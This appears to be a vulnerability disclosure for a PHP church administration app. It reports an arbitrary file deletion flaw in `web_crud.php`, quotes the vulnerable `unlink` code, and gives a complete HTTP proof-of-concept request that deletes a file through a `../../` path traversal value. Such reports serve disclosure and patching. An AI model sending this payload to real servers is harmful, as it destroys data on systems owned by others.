### Vulnerability file address

In line 414 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_portfolio_img']);`,` $_POST['old_portfolio_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['portfoliophoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["portfoliophoto"]["name"]);

            if (move_uploaded_file($_FILES["portfoliophoto"]["tmp_name"], $filepath)) {
                $img5 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_portfolio_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 385

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_portfolio_img"

../../16.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="portfoliophoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `16.txt` file in the `church/` directory

![image-20250505162652543](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051626596.png)

Then we execute the above poc to attack

![image-20250505162750539](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051627570.png)

Files are deleted after the attack is successful

![image-20250505162804704](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051628737.png)